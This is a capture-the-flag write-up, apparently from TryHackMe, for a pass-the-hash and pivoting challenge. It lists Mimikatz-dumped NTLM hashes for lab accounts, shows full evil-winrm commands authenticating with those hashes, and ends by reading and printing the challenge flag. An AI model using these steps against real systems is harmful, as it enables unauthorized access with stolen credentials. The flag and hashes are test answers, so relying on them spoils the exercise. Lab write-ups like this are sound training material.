## Dump

> Hash dump and Pivoting

![Challenge](https://github.com/user-attachments/assets/dcef75ce-b30f-4311-8f6e-b292c1e4dcef)


---

### Recon
First I identify and compile all the hashes from MimiKatz cleanly

![dumpfile](https://github.com/user-attachments/assets/9469da2e-c8e5-445a-a07d-ac11a423c981)



| Usernames    | NTLM Hash |
| ------------- | ------------- |
| Administrator  | 2dfe3378335d43f9764e581b856a662a  |
| Cipher  | 6786c31df90f9568d4ca2480affeea9a  |
| NullPhantom  | 75b216fc8d12fbd0124d0c0865118e4d  |
| Specter  | 2c3e48bac1b65c52fc0fb0cd70eaf3aa  |
| ByteReaper  | 43034346035d7a24b1eaa1c82acaef3e  |
| GhostTrace  | 4820e4687d0ed2845328aa492dc0b33c  |
| DarkInjector  | 3a659a65d9c16d40a28684995782458f  |
| ShadowPacket  | 5fe2eb8c75c48179bce6025e70859e47  |

---

### 📡 Passing The Hash attempt #1 

I commonly use Evil-winRM especially since I know that these are windows creds. 

After trying a couple of users I then tried ByteReaper

```root@ip-10-10-179-82:~# evil-winrm -u ByteReaper -i 10.10.73.227 -H 43034346035d7a24b1eaa1c82acaef3e```

![winrm success](https://github.com/user-attachments/assets/684f1922-36c6-4465-9d58-2b19418bb383)

Alas I was in! I now knew that the exploit worked and I was on the right path. 
The next logical step was to Check if ByteReaper is already in the Administrators group:
With ```net localgroup administrators```

![admin maybe?](https://github.com/user-attachments/assets/d7478e33-9bc4-42a0-8b66-14aa398c0f7c)

He was not. Time to pivot!
 
---

### Pivot baby one more time

Establishing more attacks I then tried Administrator, Cipher, with no luck – Dark injector finally worked for me.

```evil-winrm -u Darkinjector -i 10.10.73.227 -H 3a659a65d9c16d40a28684995782458f```

From here I navigated to the admin’s desktop and got the flag:

```
cd C:\Users\Administrator\Desktop
ls
type flag.txt
```

![Dark Injector working](https://github.com/user-attachments/assets/8dec5dd8-0431-4bdd-bdb9-9305ee2a23c7)

THM{1nj3ctBr34k3r5}
